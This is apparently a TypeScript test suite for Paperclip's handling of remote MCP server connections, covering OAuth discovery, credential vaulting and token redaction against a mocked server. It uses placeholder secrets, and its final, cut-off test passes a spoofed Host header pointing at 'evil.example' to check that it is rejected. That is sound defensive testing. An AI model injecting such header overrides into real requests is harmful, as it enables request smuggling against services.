import { randomUUID } from "node:crypto";
import { once } from "node:events";
import { createServer } from "node:http";
import { Writable } from "node:stream";
import express from "express";
import pino from "pino";
import request from "supertest";
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import {
  activityLog,
  agents,
  authUsers,
  companies,
  companyMemberships,
  connectionGrants,
  companySecretBindings,
  companySecrets,
  companySecretVersions,
  createDb,
  issueThreadInteractions,
  issues,
  principalPermissionGrants,
  secretAccessEvents,
  toolAccessAuditEvents,
  toolCallEvents,
  toolInvocations,
  toolActionRequests,
  toolApplications,
  toolCatalogEntries,
  toolConnectionInstalls,
  toolConnections,
  toolOauthStates,
  toolProfileBindings,
  toolProfileEntries,
  toolProfiles,
  toolRuntimeSlots,
} from "@paperclipai/db";
import { and, eq, sql } from "drizzle-orm";
import { APP_DEFINITIONS, MCP_CONFIG_HELP_PROMPT, type ToolCatalogEntry } from "@paperclipai/shared";
import {
  getEmbeddedPostgresTestSupport,
  startEmbeddedPostgresTestDatabase,
} from "./helpers/embedded-postgres.js";
import { toolAccessService } from "../services/tool-access.js";
import { ensureCompanyDefaultMcpOAuthSeeds } from "../services/default-mcp-oauth-seed.js";
import {
  DEFAULT_MCP_TEMPLATE_COMPANY_IDS_ENV,
  __resetDefaultMcpTemplateScopeForTests,
  captureDefaultMcpTemplateScope,
} from "../secrets/default-mcp-template-scope.js";
import {
  DEFAULT_MCP_SPEC_ENABLED_ENV,
  agentMayUseConnectionTool,
  agentReadCeilingForConnection,
} from "../services/default-mcp-spec.js";
import { ComposioApiError, type ComposioClient } from "../services/composio.js";
import { createComposioSessionManager } from "../services/composio-session-manager.js";
import { createToolGatewayService } from "../services/tool-gateway.js";
import { toolAccessPolicyService } from "../services/tool-access-policy.js";
import { toolAccessRoutes } from "../routes/tool-access.js";
import { errorHandler } from "../middleware/index.js";
import { createHttpLogger, logger } from "../middleware/logger.js";
import { HTTP_LOG_REDACT_PATHS } from "../middleware/http-log-redaction.js";
import { startOAuthRefreshFixture } from "../../../scripts/mcp-fixtures/servers/oauth-refresh-fixture.mjs";

const embeddedPostgresSupport = await getEmbeddedPostgresTestSupport();
const describeEmbeddedPostgres = embeddedPostgresSupport.supported ? describe : describe.skip;

/**
 * PAP-17087 — a connection to an unknown remote MCP server must get the same
 * treatment as a curated one, so these tests deliberately never name a gallery
 * app. Every endpoint below is served by the in-process fixture, so the whole
 * generic path (discovery → registration → authorization → catalog → review) is
 * deterministic and needs no network or vendor credentials.
 */

const PUBLIC_BASE_URL = "https://paperclip.fixture.test";
const REDIRECT_URI = `${PUBLIC_BASE_URL}/api/tools/oauth/callback`;
const CLIENT_METADATA_DOCUMENT_URL = `${PUBLIC_BASE_URL}/api/tools/oauth/client-metadata`;

// A public IP literal keeps the global-fetch protocol fixture deterministic.
// Hostname dispatch is intentionally DNS-pinned even in local/private mode, so
// a made-up test hostname would correctly fail DNS before reaching this mock.
const MCP_ORIGIN = "https://8.8.8.8";
const MCP_URL = `${MCP_ORIGIN}/mcp`;
/** A pathful issuer, so RFC 8414 well-known insertion is actually exercised. */
const ISSUER = `${MCP_ORIGIN}/tenant/acme`;

const FIXTURE_TOOLS = [
  { name: "list_insights", description: "List insights", annotations: { readOnlyHint: true } },
  { name: "create_insight", description: "Create an insight", annotations: { readOnlyHint: false } },
];

type FixtureOptions = {
  /** How the MCP endpoint authenticates. */
  auth?: "public" | "oauth" | "header";
  /** For `auth: "header"`, the header the endpoint requires and its value. */
  requiredHeader?: { name: string; value: string };
  /** Advertise Client ID Metadata Document support on the authorization server. */
  cimd?: boolean;
  /** Advertise a dynamic client registration endpoint. */
  dcr?: boolean;
  /** Serve authorization-server metadata under the RFC 8414 insertion path only. */
  wellKnownStyle?: "rfc8414" | "oidc-suffix";
  /**
   * Advertise this exact string as `authorization_endpoint` (PAP-17099). The
   * value is whatever a hostile server wants — it is never a trusted URL.
   */
  authorizationEndpoint?: string;
  /** Advertise this exact string as `token_endpoint` (PAP-17099). */
  tokenEndpoint?: string;
  /** Confidential-client authentication methods advertised by discovery. */
  tokenEndpointAuthMethods?: string[];
  /** Value the token endpoint returns as the issuer, for `iss` tests. */
  tools?: unknown[];
  /**
   * Fail the token endpoint with this exact body (PAP-17108). The body is
   * whatever a hostile authorization server wants to say, so tests use it to
   * prove none of it reaches the operator.
   */
  tokenFailure?: { status: number; body: Record<string, unknown> };
  /** Fail the dynamic client registration endpoint with this exact body. */
  registrationFailure?: { status: number; body: Record<string, unknown> };
  /** Extra provider-owned callbacks returned alongside the requested callback. */
  registrationExtraRedirectUris?: string[];
};

type FixtureRequest = {
  method: string;
  url: string;
  headers: Record<string, string>;
  body: URLSearchParams | Record<string, unknown> | null;
};

function jsonResponse(payload: unknown, status = 200): Response {
  const body = JSON.stringify(payload);
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: {
      get: (name: string) => (name.toLowerCase() === "content-type" ? "application/json" : null),
    },
    text: async () => body,
    json: async () => payload,
  } as unknown as Response;
}

function unauthorizedMcpResponse(resourceMetadataUrl: string): Response {
  return {
    ok: false,
    status: 401,
    headers: {
      get: (name: string) =>
        name.toLowerCase() === "www-authenticate"
          ? `Bearer resource_metadata="${resourceMetadataUrl}"`
          : null,
    },
    text: async () => "",
    json: async () => ({}),
  } as unknown as Response;
}

function headerRecord(init: RequestInit | undefined): Record<string, string> {
  const raw = init?.headers;
  if (!raw) return {};
  if (raw instanceof Headers) return Object.fromEntries(raw.entries());
  if (Array.isArray(raw)) return Object.fromEntries(raw as Array<[string, string]>);
  return Object.fromEntries(
    Object.entries(raw as Record<string, string>).map(([key, value]) => [key.toLowerCase(), value]),
  );
}

/**
 * A single fetch implementation standing in for an MCP server plus its
 * authorization server. Returns the request log so tests can assert on the exact
 * protocol parameters Paperclip sent (RFC 8707 `resource`, DCR metadata, PKCE).
 */
function installMcpOAuthFixture(options: FixtureOptions = {}) {
  const auth = options.auth ?? "public";
  const requests: FixtureRequest[] = [];
  const issuedCodes = new Map<string, { codeChallenge: string; resource: string | null }>();
  let toolsListGateFired = false;
  let accessToken: string | null = null;
  const tools = options.tools ?? FIXTURE_TOOLS;
  const resourceMetadataUrl = `${MCP_ORIGIN}/.well-known/oauth-protected-resource/mcp`;

  const authorizationServerMetadata = () => ({
    issuer: ISSUER,
    authorization_endpoint: options.authorizationEndpoint ?? `${ISSUER}/authorize`,
    token_endpoint: options.tokenEndpoint ?? `${ISSUER}/token`,
    ...(options.dcr === false ? {} : { registration_endpoint: `${ISSUER}/register` }),
    ...(options.cimd ? { client_id_metadata_document_supported: true } : {}),
    code_challenge_methods_supported: ["S256"],
    token_endpoint_auth_methods_supported: options.tokenEndpointAuthMethods ?? ["none"],
    scopes_supported: ["mcp:read", "mcp:write"],
  });

  const fetchMock = vi.spyOn(globalThis, "fetch").mockImplementation(async (url, init) => {
    const href = String(url);
    const method = (init?.method ?? "GET").toUpperCase();
    const headers = headerRecord(init);
    const bodyText = typeof init?.body === "string" ? init.body : init?.body?.toString?.() ?? null;
    const parsedBody = bodyText
      ? headers["content-type"]?.includes("json")
        ? (JSON.parse(bodyText) as Record<string, unknown>)
        : new URLSearchParams(bodyText)
      : null;
    requests.push({ method, url: href, headers, body: parsedBody });

    if (href === MCP_URL && method === "POST") {
      if (auth === "oauth" && headers.authorization !== `Bearer ${accessToken}`) {
        return unauthorizedMcpResponse(resourceMetadataUrl);
      }
      if (auth === "header" && options.requiredHeader) {
        const supplied = headers[options.requiredHeader.name.toLowerCase()];
        if (supplied !== options.requiredHeader.value) return unauthorizedMcpResponse(resourceMetadataUrl);
      }
      const rpc = parsedBody as Record<string, unknown>;
      // Session-required connections (default-MCP seeds/instances set mcpSessionRequired) run the
      // MCP initialize handshake first; answer it like a real server so the id check passes.
      if (rpc.method === "initialize") {
        return jsonResponse({ jsonrpc: "2.0", id: rpc.id, result: {
          protocolVersion: "2025-06-18",
          capabilities: { tools: {} },
          serverInfo: { name: "fixture", version: "0.0.0" },
        } });
      }
      if (rpc.method === "notifications/initialized") return new Response(null, { status: 202 });
      if (rpc.method === "tools/call") {
        return jsonResponse({ jsonrpc: "2.0", id: rpc.id, result: {
          content: [{ type: "text", text: "Fixture meeting data" }],
          structuredContent: { meeting_id: "meeting-1" },
        } });
      }
      // The optional tools/list barrier fires once, exactly where the tools result is
      // served: mid-catalog-refresh (after any pre-network snapshot, before the caller
      // proceeds). Unused by every other test in this file.
      const rpcMethod =
        parsedBody && !(parsedBody instanceof URLSearchParams)
          ? (parsedBody as { method?: unknown }).method
          : undefined;
      if (rpcMethod === "tools/list" && options.toolsListGate && !toolsListGateFired) {
        toolsListGateFired = true;
        await options.toolsListGate();
      }
      return jsonResponse({ jsonrpc: "2.0", id: rpc.id ?? "paperclip-catalog-refresh", result: { tools } });
    }

    if (href === resourceMetadataUrl) {
      return jsonResponse({ resource: MCP_URL, authorization_servers: [ISSUER] });
    }

    // RFC 8414 inserts the well-known segment before the issuer path; OIDC
    // Discovery appends it. The fixture serves whichever style the test asked
    // for so both discovery orders are covered.
    const rfc8414Url = `${MCP_ORIGIN}/.well-known/oauth-authorization-server/tenant/acme`;
    const oidcSuffixUrl = `${ISSUER}/.well-known/oauth-authorization-server`;
    const servedMetadataUrl = options.wellKnownStyle === "oidc-suffix" ? oidcSuffixUrl : rfc8414Url;
    if (href === servedMetadataUrl) return jsonResponse(authorizationServerMetadata());

    if (href === `${ISSUER}/register` && method === "POST") {
      if (options.registrationFailure) {
        return jsonResponse(options.registrationFailure.body, options.registrationFailure.status);
      }
      if (options.dcr === false) return jsonResponse({ error: "not_supported" }, 404);
      const requested = parsedBody as Record<string, unknown>;
      return jsonResponse({
        client_id: "fixture-dcr-client",
        // A conforming server echoes back what it registered, and Paperclip
        // requires its own callback even when the provider adds a routing URI.
        redirect_uris: [
          ...(requested.redirect_uris as string[]),
          ...(options.registrationExtraRedirectUris ?? []),
        ],
        grant_types: requested.grant_types,
        response_types: requested.response_types,
        token_endpoint_auth_method: requested.token_endpoint_auth_method,
        application_type: requested.application_type,
        // A confidential registration (RFC 7591) is issued a secret.
        ...(requested.token_endpoint_auth_method === "none" ? {} : { client_secret: "fixture-dcr-secret" }),
      });
    }

    if (href === `${ISSUER}/token` && method === "POST") {
      if (options.tokenFailure) return jsonResponse(options.tokenFailure.body, options.tokenFailure.status);
      const body = parsedBody as URLSearchParams;
      const grantType = body.get("grant_type");
      if (grantType === "authorization_code") {
        const issued = issuedCodes.get(body.get("code") ?? "");
        if (!issued) return jsonResponse({ error: "invalid_grant" }, 400);
      }
      accessToken = `fixture-access-${randomUUID()}`;
      return jsonResponse({
        access_token: accessToken,
        refresh_token: "fixture-refresh",
        expires_in: 3600,
        token_type: "Bearer",
        scope: "mcp:read",
      });
    }

    // 404 rather than throw: discovery legitimately probes several well-known
    // paths, and a real server answers the ones it does not serve with a 404.
    return jsonResponse({ error: "not_found" }, 404);
  });

  return {
    fetchMock,
    requests,
    /** Pretend the operator approved the consent screen and got a code back. */
    issueAuthorizationCode(authorizationUrl: string) {
      const parsed = new URL(authorizationUrl);
      const code = `fixture-code-${randomUUID()}`;
      issuedCodes.set(code, {
        codeChallenge: parsed.searchParams.get("code_challenge") ?? "",
        resource: parsed.searchParams.get("resource"),
      });
      return code;
    },
    requestsTo(pathSuffix: string) {
      return requests.filter((entry) => entry.url.endsWith(pathSuffix));
    },
  };
}

async function createCompany(db: ReturnType<typeof createDb>) {
  const company = await db
    .insert(companies)
    .values({
      name: `Generic MCP ${randomUUID()}`,
      issuePrefix: `GM${randomUUID().slice(0, 6).toUpperCase()}`,
    })
    .returning()
    .then((rows) => rows[0]!);
  await db.insert(companyMemberships).values({
    companyId: company.id,
    principalType: "user",
    principalId: "board-user",
    status: "active",
    membershipRole: "admin",
  });
  return company;
}

function createRouteApp(
  db: ReturnType<typeof createDb>,
  deployment?: {
    deploymentMode: "authenticated" | "local_trusted";
    deploymentExposure: "public" | "private";
    remoteHttpEndpointLookup?: NonNullable<Parameters<typeof toolAccessService>[1]>["remoteHttpEndpointLookup"];
    remoteHttpRequest?: NonNullable<Parameters<typeof toolAccessService>[1]>["remoteHttpRequest"];
  },
  requestLogger?: express.RequestHandler,
) {
  const app = express();
  app.use(express.json());
  if (requestLogger) app.use(requestLogger);
  app.use((req, _res, next) => {
    req.actor = {
      type: "board",
      userId: "board-user",
      userName: "Board User",
      userEmail: null,
      isInstanceAdmin: true,
      source: "local_implicit",
    };
    next();
  });
  app.use("/api", toolAccessRoutes(db, { ...deployment }));
  app.use(errorHandler);
  return app;
}

describeEmbeddedPostgres("generic remote MCP connections", () => {
  let db!: ReturnType<typeof createDb>;
  let tempDb: Awaited<ReturnType<typeof startEmbeddedPostgresTestDatabase>> | null = null;

  beforeAll(async () => {
    tempDb = await startEmbeddedPostgresTestDatabase("paperclip-generic-mcp-");
    db = createDb(tempDb.connectionString);
  }, 20_000);

  afterEach(async () => {
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
    await db.delete(toolCallEvents);
    await db.delete(toolInvocations);
    await db.delete(toolActionRequests);
    await db.delete(toolOauthStates);
    await db.delete(secretAccessEvents);
    await db.delete(companySecretBindings);
    await db.delete(companySecretVersions);
    await db.delete(companySecrets);
    await db.delete(activityLog);
    await db.delete(toolAccessAuditEvents);
    await db.delete(toolRuntimeSlots);
    await db.delete(toolConnectionInstalls);
    await db.delete(toolProfileBindings);
    await db.delete(toolProfileEntries);
    await db.delete(toolProfiles);
    await db.delete(toolCatalogEntries);
    await db.delete(toolConnections);
    await db.delete(toolApplications);
    await db.delete(issueThreadInteractions);
    await db.delete(issues);
    await db.delete(principalPermissionGrants);
    await db.delete(companyMemberships);
    await db.delete(agents);
    await db.execute(sql`truncate table ${companies} restart identity cascade`);
    await db.delete(authUsers);
  });

  afterAll(async () => {
    await tempDb?.cleanup();
  });

  async function waitForBlockedMembershipUpdate() {
    for (let attempt = 0; attempt < 80; attempt += 1) {
      const [waiting] = await db.execute<{ waiting: boolean }>(sql`
        SELECT EXISTS (
          SELECT 1
          FROM pg_stat_activity
          WHERE state = 'active'
            AND wait_event_type = 'Lock'
            AND query ILIKE '%company_memberships%'
            AND query ILIKE '%for update%'
        ) AS waiting
      `);
      if (waiting?.waiting) return true;
      await new Promise((resolve) => setTimeout(resolve, 25));
    }
    return false;
  }

  it.each(["mcp-oauth", "mcp-api-key"])("connects Fireflies through %s with vaulted credentials and its stable meeting tools", async (methodKey) => {
    // Keep the real catalog method and governance identity; redirect only its
    // transport URL to the deterministic protocol fixture.
    const method = APP_DEFINITIONS.find((app) => app.slug === "fireflies")!.methods.find((entry) => entry.key === methodKey)!;
    const originalUrl = method.defaults!.serverUrl;
    method.defaults!.serverUrl = MCP_URL;
    try {
      const names = ["fireflies_get_transcripts", "fireflies_get_transcript", "fireflies_get_summary"];
      const availableTools = [...names.map((name) => ({ name, annotations: { readOnlyHint: true } })), { name: "fireflies_share_meeting" }, { name: "fireflies_move_meeting" }];
      const fixture = installMcpOAuthFixture({
        auth: methodKey === "mcp-oauth" ? "oauth" : "header",
        requiredHeader: { name: "Authorization", value: "Bearer fixture-fireflies-key" },
        tools: availableTools,
      });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const connected = await service.connectGalleryApp(company.id, {
        galleryKey: "fireflies", connectionMethodKey: methodKey,
        ...(methodKey === "mcp-api-key" ? { credentialValues: { "credentials.authorization": "fixture-fireflies-key" } } : {}),
      });
      if (methodKey === "mcp-oauth") {
        const actor = { actorType: "user" as const, actorId: "board-user" };
        const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
        expect(start.registrationSource).toBe("dcr");
        const url = new URL(start.authorizationUrl);
        expect(url.searchParams.get("code_challenge_method")).toBe("S256");
        const completed = await service.completeOAuthCallback({ state: url.searchParams.get("state")!, code: fixture.issueAuthorizationCode(start.authorizationUrl), iss: ISSUER, redirectUri: REDIRECT_URI, actor });
        expect(completed.actions.readOnly.map((action) => action.toolName)).toEqual(names);
      } else {
        expect(connected.actions.readOnly.map((action) => action.toolName)).toEqual(names);
        expect(connected.actions.canMakeChanges.map((action) => action.toolName)).toEqual(["fireflies_share_meeting", "fireflies_move_meeting"]);
        expect(fixture.requestsTo("/mcp").at(-1)?.headers.authorization).toBe("Bearer fixture-fireflies-key");
      }
      const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
      expect(connection!.config).toMatchObject({ sourceTemplateKey: "fireflies", connectionMethodKey: methodKey });
      expect(connection!.credentialSecretRefs.length).toBeGreaterThan(0);
      expect(JSON.stringify({ connected, connection })).not.toContain("fixture-fireflies-key");
      expect(JSON.stringify(connection!.config)).not.toContain("fixture-access-");
      const refreshed = await service.refreshCatalog(connected.connectionId, { actorType: "user", actorId: "board-user" });
      const [agent] = await db.insert(agents).values({ companyId: company.id, name: "Meeting reviewer", role: "engineer", status: "active", adapterType: "process", adapterConfig: {}, runtimeConfig: {} }).returning();
      await service.finishGalleryAppConnection(company.id, connected.connectionId, {
        enabledCatalogEntryIds: refreshed.catalog.filter((entry) => entry.toolName !== "fireflies_move_meeting").map((entry) => entry.id),
        askFirstCatalogEntryIds: refreshed.catalog.filter((entry) => entry.toolName === "fireflies_share_meeting").map((entry) => entry.id),
        access: { agentIds: [agent!.id] },
      }, { actorType: "user", actorId: "board-user" });
      const gateway = createToolGatewayService(db, { toolActionSigningSecret: "fireflies-test-only-signing-secret" });
      for (const toolName of names) {
        await expect(gateway.executeTestCall({ companyId: company.id, connectionId: connected.connectionId, agentId: agent!.id, userId: "board-user", toolName, parameters: {} }))
          .resolves.toMatchObject({ decision: "allowed", result: { data: { structuredContent: { meeting_id: "meeting-1" } } } });
      }
      const policy = toolAccessPolicyService(db);
      const entry = refreshed.catalog.find((item) => item.toolName === "fireflies_share_meeting")!;
      // Re-authentication must retain both Off and Ask first selections.
      // Newly discovered tools still receive the normal connection defaults.
      availableTools.push({ name: "fixture_new_read", annotations: { readOnlyHint: true } });
      if (methodKey === "mcp-oauth") {
        const actor = { actorType: "user" as const, actorId: "board-user" };
        const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
        await service.completeOAuthCallback({ state: new URL(start.authorizationUrl).searchParams.get("state")!, code: fixture.issueAuthorizationCode(start.authorizationUrl), iss: ISSUER, redirectUri: REDIRECT_URI, actor });
      } else {
        const reconnected = await service.reconnectGalleryApp(connected.connectionId, company.id, {
          credentialValues: { "credentials.authorization": "fixture-fireflies-key" },
        });
        expect(reconnected.connection.id).toBe(connected.connectionId);
      }
      await service.refreshCatalog(connected.connectionId, { actorType: "user", actorId: "board-user" });
      await expect(gateway.executeTestCall({ companyId: company.id, connectionId: connected.connectionId, agentId: agent!.id, userId: "board-user", toolName: "fixture_new_read", parameters: {} }))
        .resolves.toMatchObject({ decision: "allowed" });
      await expect(policy.decide({ companyId: company.id, actor: { actorType: "agent", actorId: agent!.id, agentId: agent!.id }, request: { connectionId: connected.connectionId, catalogEntryId: entry.id, toolName: entry.toolName } }))
        .resolves.toMatchObject({ allowed: false, decision: "require_approval" });
      const offEntry = refreshed.catalog.find((item) => item.toolName === "fireflies_move_meeting")!;
      await expect(policy.decide({ companyId: company.id, actor: { actorType: "agent", actorId: agent!.id, agentId: agent!.id }, request: { connectionId: connected.connectionId, catalogEntryId: offEntry.id, toolName: offEntry.toolName } }))
        .resolves.toMatchObject({ allowed: false, decision: "deny" });
      await expect(gateway.executeTestCall({ companyId: randomUUID(), connectionId: connected.connectionId, agentId: agent!.id, userId: "board-user", toolName: names[0]!, parameters: {} })).rejects.toThrow();
      await service.archiveConnection(connected.connectionId, company.id);
      await expect(gateway.executeTestCall({ companyId: company.id, connectionId: connected.connectionId, agentId: agent!.id, userId: "board-user", toolName: names[0]!, parameters: {} })).rejects.toThrow();
      expect((await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId)))[0]?.status).toBe("archived");
    } finally {
      method.defaults!.serverUrl = originalUrl;
    }
  });

  it("discovers every tool for a public unknown endpoint without activating the draft", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const result = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture MCP" });

    expect(result.auth ?? null).toBeNull();
    expect(result.actions.readOnly.map((action) => action.toolName)).toEqual(["list_insights"]);
    expect(result.actions.canMakeChanges.map((action) => action.toolName)).toEqual(["create_insight"]);
    expect(result.suggestedDefaults).toMatchObject({ askFirstRiskLevels: [] });

    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, result.connectionId));
    expect(connection).toMatchObject({ transport: "mcp_remote", authKind: "none", status: "draft" });
    expect(connection!.config).toMatchObject({ quarantineNewEntries: false, unverifiedServer: true });
    // No curated definition was consulted: nothing recorded a template key, so
    // this connection cannot be depending on gallery metadata for anything.
    expect(connection!.config).not.toHaveProperty("sourceTemplateKey");
    expect(connection!.config).not.toHaveProperty("connectionMethodKey");
    await expect(service.listConnectionGrants(result.connectionId, company.id)).resolves.toMatchObject({
      grants: [expect.objectContaining({ kind: "organization", isDefault: true, credentialSecretRefs: [] })],
    });
    const profiles = await db.select().from(toolProfiles).where(eq(
      toolProfiles.profileKey,
      `app:${result.connectionId}`,
    ));
    expect(profiles).toEqual([]);
  });

  it.each(["organization", "user"] as const)("vaults a credential-bearing MCP URL for %s and never returns or logs its token", async (grantKind) => {
    const secretUrl = `${MCP_URL}?token=zapier-secret&region=us`;
    const publicUrl = `${MCP_URL}?region=us`;
    const requests: string[] = [];
    vi.spyOn(globalThis, "fetch").mockImplementation(async (url, init) => {
      requests.push(String(url));
      if (String(url) === secretUrl && (init?.method ?? "GET").toUpperCase() === "POST") {
        return jsonResponse({
          jsonrpc: "2.0",
          id: "paperclip-catalog-refresh",
          result: { tools: FIXTURE_TOOLS },
        });
      }
      return jsonResponse({ error: "not_found" }, 404);
    });
    const company = await createCompany(db);
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({ link: secretUrl, name: "Token URL fixture", grantKind })
      .expect(201);

    expect(requests).toContain(secretUrl);
    expect(JSON.stringify(response.body)).not.toContain("zapier-secret");
    expect(response.body.connection.config.url).toBe(publicUrl);
    expect(response.body.connection.transportConfig.url).toBe(publicUrl);
    expect(response.body.connection.credentialRefs).toEqual([
      expect.objectContaining({ placement: "url", name: "remote.url", key: "url" }),
    ]);

    const [connection] = await db.select().from(toolConnections).where(eq(
      toolConnections.id,
      response.body.connectionId,
    ));
    expect(connection!.config.url).toBe(publicUrl);
    const expectedRefs = [expect.objectContaining({ configPath: "remote.url", label: "MCP server URL" })];
    expect(connection!.credentialSecretRefs).toEqual(grantKind === "user" ? [] : expectedRefs);
    const grants = await db.select().from(connectionGrants).where(eq(
      connectionGrants.connectionId,
      response.body.connectionId,
    ));
    expect(grants).toEqual([
      expect.objectContaining({
        kind: grantKind,
        credentialSecretRefs: expectedRefs,
        ...(grantKind === "user" ? { subjectUserId: "board-user" } : {}),
      }),
    ]);
    expect(await db.select().from(companySecrets)).toHaveLength(1);
    expect(JSON.stringify(await db.select().from(activityLog))).not.toContain("zapier-secret");
  });

  it("keeps a generated Zapier URL attached to the curated Zapier identity", async () => {
    const secretUrl = "https://mcp.zapier.com/api/v1/connect?token=zapier-secret";
    const publicUrl = "https://mcp.zapier.com/api/v1/connect";
    const company = await createCompany(db);
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
      remoteHttpEndpointLookup: async () => [{ address: "8.8.8.8", family: 4 }],
      remoteHttpRequest: async (url, init) => {
        if (url === secretUrl && (init.method ?? "GET").toUpperCase() === "POST") {
          const body = JSON.parse(String(init.body));
          if (body.method === "notifications/initialized") return new Response(null, { status: 202 });
          return jsonResponse({
            jsonrpc: "2.0",
            id: body.id,
            result: body.method === "initialize" ? { protocolVersion: "2025-06-18" } : { tools: FIXTURE_TOOLS },
          });
        }
        return jsonResponse({ error: "not_found" }, 404);
      },
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({
        galleryKey: "zapier",
        connectionMethodKey: "generated-url",
        link: secretUrl,
        name: "Zapier for the company",
      });

    expect(response.status, JSON.stringify(response.body)).toBe(201);

    expect(response.body.connection.config).toMatchObject({
      url: publicUrl,
      sourceTemplateKey: "zapier",
      connectionMethodKey: "generated-url",
    });
    expect(JSON.stringify(response.body)).not.toContain("zapier-secret");

    const [application] = await db.select().from(toolApplications).where(eq(
      toolApplications.id,
      response.body.application.id,
    ));
    expect(application).toMatchObject({
      applicationKey: expect.stringMatching(/^app-gallery:zapier:/),
      metadata: expect.objectContaining({
        sourceTemplateKey: "zapier",
        galleryKey: "zapier",
      }),
    });
  });

  it("rejects a generated URL for curated methods that do not declare one", async () => {
    const company = await createCompany(db);
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({
        galleryKey: "notion",
        connectionMethodKey: "mcp-oauth",
        link: "https://mcp.notion.com/mcp",
      })
      .expect(400);

    expect(response.body.error).toContain("does not accept a provider-generated connection URL");
    await expect(db.select().from(toolApplications)).resolves.toHaveLength(0);
  });

  it("emits DNS guidance for a real NXDOMAIN failure", async () => {
    const company = await createCompany(db);
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({ link: "https://qa-nonexistent.invalid/mcp", name: "Missing DNS fixture" });

    // Public-mode preflight returns 400; local-mode platform fetch reports the
    // same failure from the health check as 502. The machine code is the stable
    // UI contract across both paths.
    expect([400, 502]).toContain(response.status);
    expect(response.body).toMatchObject({
      details: { code: "remote_http_dns_failed" },
    });
    expect(response.body.error).not.toBe("fetch failed");
    await expect(db.select().from(toolApplications)).resolves.toHaveLength(0);
  });

  it("automatically gives a new connection a distinct name when its default is already used", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    await db.insert(toolApplications).values({
      companyId: company.id,
      applicationKey: `existing:${randomUUID()}`,
      name: "Taken fixture name",
      type: "mcp_http",
      status: "active",
      metadata: {},
    });
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .post(`/api/companies/${company.id}/tools/apps/connect`)
      .send({ link: MCP_URL, name: "Taken fixture name" })
      .expect(201);

    expect(response.body.application.name).toBe("Taken fixture name (2)");
    expect(response.body.connection.name).toBe("Taken fixture name (2)");
    await expect(
      db.select({ name: toolApplications.name })
        .from(toolApplications)
        .where(eq(toolApplications.companyId, company.id)),
    ).resolves.toEqual(expect.arrayContaining([
      { name: "Taken fixture name" },
      { name: "Taken fixture name (2)" },
    ]));
  });

  it("emits deployment guidance without exposing server env-var names", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", "");
    vi.stubEnv("PAPERCLIP_AUTH_PUBLIC_BASE_URL", "");
    vi.stubEnv("BETTER_AUTH_URL", "");
    vi.stubEnv("BETTER_AUTH_BASE_URL", "");
    vi.stubEnv("PAPERCLIP_MANAGED_RUNTIME_PUBLIC_URL", "");
    const app = createRouteApp(db, {
      deploymentMode: "local_trusted",
      deploymentExposure: "private",
    });

    const response = await request(app)
      .get("/api/tools/oauth/client-metadata")
      .set("Host", "paperclip.example.test")
      .expect(422);

    expect(response.body).toMatchObject({
      details: { code: "oauth_redirect_origin_unsupported" },
    });
    expect(JSON.stringify(response.body)).not.toContain("PAPERCLIP_PUBLIC_URL");
  });

  it("stores a bearer key as a secret and never reads it back", async () => {
    installMcpOAuthFixture({
      auth: "header",
      requiredHeader: { name: "Authorization", value: "Bearer fixture-key-123" },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const result = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture bearer",
      authMode: "bearer",
      credentialValues: { "credentials.authorization": "fixture-key-123" },
    });

    expect(result.catalog).toHaveLength(2);
    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, result.connectionId));
    expect(connection!.authKind).toBe("api_key");
    expect(JSON.stringify(connection!.config)).not.toContain("fixture-key-123");
    expect(JSON.stringify(connection!.credentialRefs)).not.toContain("fixture-key-123");
    expect(JSON.stringify(result.connection)).not.toContain("fixture-key-123");
    expect(connection!.credentialSecretRefs.map((ref) => ref.configPath)).toEqual(["credentials.authorization"]);
  });




  it("stores custom header values as secrets and shows only header names", async () => {
    installMcpOAuthFixture({
      auth: "header",
      requiredHeader: { name: "X-Api-Key", value: "phx_fixture_secret" },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const result = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture headers",
      authMode: "custom_headers",
      credentialValues: { "headers.X-Api-Key": "phx_fixture_secret" },
    });

    expect(result.catalog).toHaveLength(2);
    const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, result.connectionId));
    const serialized = JSON.stringify({
      config: connection!.config,
      credentialRefs: connection!.credentialRefs,
      credentialSecretRefs: connection!.credentialSecretRefs,
    });
    expect(serialized).not.toContain("phx_fixture_secret");
    // The header *name* is what review and diagnostics get to show.
    expect(serialized).toContain("X-Api-Key");
  });

  it("rejects header names Paperclip refuses to send", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    await expect(service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture unsafe header",
      credentialValues: { "headers.Host": "evil.example" },
